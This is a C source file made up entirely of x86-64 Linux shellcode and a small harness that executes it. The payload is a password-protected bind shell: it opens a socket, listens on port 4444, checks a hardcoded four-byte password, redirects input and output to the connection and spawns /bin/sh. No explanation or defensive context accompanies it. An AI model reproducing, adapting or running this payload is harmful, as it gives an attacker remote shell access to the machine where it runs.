unsigned char shellcode[] = 
	"\x6a\x29"                      /* pushq  $0x29 */
	"\x58"                          /* pop    %rax */
	"\x99"                          /* cltd */
	"\x6a\x02"                      /* pushq  $0x2 */
	"\x5f"                          /* pop    %rdi */
	"\x6a\x01"                      /* pushq  $0x1 */
	"\x5e"                          /* pop    %rsi */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x52"                          /* push   %rdx */
	"\x52"                          /* push   %rdx */
	"\xc6\x04\x24\x02"              /* movb   $0x2,(%rsp) */
	"\x66\xc7\x44\x24\x02\x11\x5c"  /* movw   $0x5c11,0x2(%rsp) */
	"\x54"                          /* push   %rsp */
	"\x5e"                          /* pop    %rsi */
	"\x52"                          /* push   %rdx */
	"\x6a\x10"                      /* pushq  $0x10 */
	"\x5a"                          /* pop    %rdx */
	"\x6a\x31"                      /* pushq  $0x31 */
	"\x58"                          /* pop    %rax */
	"\x0f\x05"                      /* syscall */
	"\x5e"                          /* pop    %rsi */
	"\xb0\x32"                      /* mov    $0x32,%al */
	"\x0f\x05"                      /* syscall */
	"\xb0\x2b"                      /* mov    $0x2b,%al */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x54"                          /* push   %rsp */
	"\x5e"                          /* pop    %rsi */
	"\x31\xc0"                      /* xor    %eax,%eax */
	"\x0f\x05"                      /* syscall */
	"\x81\x3c\x24\x5a\x7e\x72\x30"  /* cmpl   $0x30727e5a,(%rsp) */
	"\x75\x1f"                      /* jne    5f <drop> */
	"\x6a\x03"                      /* pushq  $0x3 */
	"\x5e"                          /* pop    %rsi */
	"\xff\xce"                      /* dec    %esi */
	"\xb0\x21"                      /* mov    $0x21,%al */
	"\x0f\x05"                      /* syscall */
	"\x75\xf8"                      /* jne    43 <dupe_loop> */
	"\x56"                          /* push   %rsi */
	"\x5a"                          /* pop    %rdx */
	"\x56"                          /* push   %rsi */
	"\x48\xbf\x2f\x2f\x62\x69\x6e"  /* movabs $0x68732f6e69622f2f,%rdi */
	"\x2f\x73\x68"                  /* . */
	"\x57"                          /* push   %rdi */
	"\x54"                          /* push   %rsp */
	"\x5f"                          /* pop    %rdi */
	"\xb0\x3b"                      /* mov    $0x3b,%al */
	"\x0f\x05"                      /* syscall */;

int main(void)
{
	(*(void(*)()) shellcode)();

	return 0;
}